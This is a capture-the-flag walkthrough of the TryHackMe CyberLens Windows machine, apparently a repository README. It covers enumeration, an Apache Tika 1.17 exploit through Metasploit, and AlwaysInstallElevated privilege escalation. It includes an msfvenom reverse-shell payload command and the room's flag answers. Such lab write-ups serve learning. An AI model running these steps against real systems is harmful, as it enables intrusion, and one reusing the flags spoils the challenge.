# TryHackMe: CyberLens — Complete Walkthrough (Enumeration → Exploitation → Privilege Escalation)

> A complete walkthrough of the **CyberLens** machine on TryHackMe covering reconnaissance, web application enumeration, Apache Tika exploitation, and Windows privilege escalation.

---

## Overview

**CyberLens** is an excellent beginner-to-intermediate Windows machine that demonstrates how small pieces of information discovered during enumeration can be chained together into full system compromise.

Throughout this room we'll perform:

* Initial reconnaissance
* Service enumeration
* Web application analysis
* Directory brute-forcing
* JavaScript analysis
* Apache Tika exploitation
* Initial shell access
* Windows privilege escalation
* Administrator compromise

---

## Attack Path

```text
Target Enumeration
        │
        ▼
Nmap Scan
        │
        ▼
Website Enumeration
        │
        ▼
Directory Bruteforce
        │
        ▼
JavaScript Analysis
        │
        ▼
Apache Tika Discovery
        │
        ▼
Exploit Apache Tika
        │
        ▼
Meterpreter Shell
        │
        ▼
User Flag
        │
        ▼
AlwaysInstallElevated
        │
        ▼
Administrator Shell
        │
        ▼
Root Flag
```

---

# Video Walkthrough

I also created a **full video walkthrough** explaining every step in detail.

🎥 **Part 1:** *(Add YouTube Link)*

🎥 **Part 2:** *(Add YouTube Link)*

---

# Lab Information

Target IP:

```text
10.112.142.5
```

Before scanning, add the machine to your hosts file.

```bash
sudo nano /etc/hosts
```

```text
10.112.142.5 cyberlens.thm
```

Although optional, this makes future enumeration much easier.

---

# Phase 1 — Initial Enumeration

Every penetration test begins with reconnaissance.

The first objective is identifying exposed services.

```bash
nmap -sC -sV 10.112.142.5 -oN nmap_scan.txt
```

### Scan Results

| Port | Service            |
| ---- | ------------------ |
| 80   | Apache HTTP Server |
| 135  | MSRPC              |
| 139  | NetBIOS            |
| 445  | SMB                |
| 3389 | Remote Desktop     |

Additional observations:

* Windows operating system
* Apache HTTP Server **2.4.57**
* SMB Signing enabled (not required)
* SSL certificate reveals hostname **CyberLens**

Immediately, two interesting attack surfaces stand out:

* The web application (Port 80)
* SMB services

The web server becomes our initial focus.

---

# Phase 2 — Website Enumeration

Opening the website displays:

> **CyberLens: Unveiling the Hidden Matrix**

Since the application revolves around image processing, I initially tested whether file uploads could lead to Remote Code Execution.

I generated a PHP reverse shell using:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
LHOST=<YOUR_IP> \
LPORT=<PORT> \
-f raw \
-o shell.php
```

I also configured a Metasploit multi-handler.

However, after testing, it became clear that the application **does not actually upload files**. Instead, it only extracts metadata from uploaded images.

This meant Remote Code Execution through file uploads was not possible.

Time to enumerate further.

---

# Phase 3 — Directory Enumeration

Next, I performed directory brute-forcing using Gobuster.

```bash
gobuster dir \
-u http://10.112.142.5 \
-w ~/Tools/wordlists/dirb/big.txt
```

Interesting directories discovered:

```text
/images
/css
/js
```

Most directories contained only static assets.

The **/js** directory, however, revealed something much more interesting.

---

# Phase 4 — JavaScript Analysis

Inside the JavaScript files, I found:

```text
image-extractor.js
```

Reviewing the source code revealed a request to:

```text
http://localhost:61777/meta
```

This is an extremely valuable finding.

Why?

Because it indicates the web application communicates with a **backend service** running locally on port **61777**.

The `/meta` endpoint wasn't directly accessible, so I investigated the root service instead.

Visiting:

```text
http://10.112.142.5:61777
```

revealed:

```text
Apache Tika 1.17 Server
```

This immediately shifted the focus from the web application to the backend service.

---

# Understanding Apache Tika

Apache Tika is an open-source toolkit used for extracting metadata and text from documents such as:

* Images
* PDFs
* Microsoft Office files
* Archives
* Multimedia files

The version discovered:

```text
Apache Tika 1.17
```

is significantly outdated and contains publicly known vulnerabilities.

Whenever outdated software is identified during a penetration test, it's worth checking whether public exploits exist.

---

# Phase 5 — Exploiting Apache Tika

Using Metasploit:

```text
search tika
```

I found the module:

```text
exploit/windows/http/apache_tika_jp2_jscript
```

Configuration:

```text
set RHOSTS 10.112.142.5

set RPORT 61777

set LHOST <YOUR_THM_IP>

run
```

> **Note:** My first attempt failed because I accidentally used my local network IP instead of my TryHackMe VPN address for `LHOST`. Once corrected, the exploit succeeded immediately.

A Meterpreter session was established, giving us initial access to the machine.

---

# Phase 6 — Capturing the User Flag

After gaining a shell, I explored the filesystem and navigated to the user's Desktop.

Reading:

```text
user.txt
```

revealed:

```text
THM{T1k4-CV3-f0r-7h3-w1n}
```

The first objective was complete.

---

# Phase 7 — Privilege Escalation

With user-level access established, the next goal was to identify privilege escalation opportunities.

Searching Metasploit for common Windows privilege escalation modules revealed:

```text
search always_install_elevated
```

This pointed to the **AlwaysInstallElevated** misconfiguration.

## What is AlwaysInstallElevated?

Windows Installer policies can be configured to allow MSI packages to run with **SYSTEM privileges**.

If both required registry values are enabled, any user can execute a malicious MSI installer and obtain Administrator privileges.

This machine was intentionally configured with this vulnerability.

---

# Exploiting AlwaysInstallElevated

Configure the exploit:

```text
set SESSION <session_id>

set LHOST <YOUR_THM_IP>

run
```

The exploit successfully spawned a new Meterpreter session running with Administrator privileges.

---

# Phase 8 — Administrator Access

With elevated privileges, navigate to the Administrator Desktop.

Reading:

```text
root.txt
```

returns:

```text
THM{3lev@t3D-4-pr1v35c!}
```

Machine successfully compromised.

---

# Tools Used

| Tool                    | Purpose                  |
| ----------------------- | ------------------------ |
| Nmap                    | Service Enumeration      |
| Gobuster                | Directory Enumeration    |
| Browser Developer Tools | JavaScript Analysis      |
| Metasploit              | Apache Tika Exploitation |
| Meterpreter             | Post-Exploitation        |
| Windows Command Line    | System Enumeration       |

---

# Key Takeaways

This room highlights how successful penetration testing often depends on careful observation rather than complex exploits.

Throughout the challenge, we learned how to:

* Perform comprehensive Windows reconnaissance.
* Enumerate web applications effectively.
* Discover hidden backend services through JavaScript analysis.
* Identify and exploit outdated software versions.
* Gain an initial foothold using a public Apache Tika exploit.
* Capture user-level access and retrieve sensitive information.
* Exploit the **AlwaysInstallElevated** Windows misconfiguration for privilege escalation.
* Obtain full Administrator access.

More importantly, CyberLens demonstrates that **every piece of information gathered during enumeration can become the key to the next stage of an attack**.

---

# Final Thoughts

CyberLens is an excellent machine for anyone learning Windows penetration testing. It reinforces a core principle of offensive security:

> **Good enumeration leads to successful exploitation.**


If you're preparing for certifications such as **PNPT**, **eJPT**, **OSCP**, or simply building your Active Directory and Windows exploitation skills, this room is well worth completing.

If you found this walkthrough helpful, consider leaving a ⭐ on the repository. Feedback, suggestions, and discussions are always welcome.

Happy learning, and happy hacking! 🚀
